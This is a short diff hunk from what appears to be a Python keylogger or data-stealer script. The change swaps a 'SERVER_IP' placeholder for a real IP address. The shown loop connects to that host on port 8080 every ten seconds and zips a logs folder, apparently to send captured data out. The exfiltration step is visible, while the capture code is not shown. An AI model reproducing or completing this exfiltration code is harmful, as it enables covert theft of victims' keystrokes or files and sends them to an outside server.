@@ -10,7 +10,7 @@ lpath = "./logs/readable.txt"
 while True:
     time.sleep(10)
     try:
-        s.connect(("SERVER_IP", 8080)) # MODIFY ME
+        s.connect(("40.71.59.211", 8080)) # MODIFY ME
 
         name = './logs/bl.zip'
         archive = ZipFile(name, 'w')
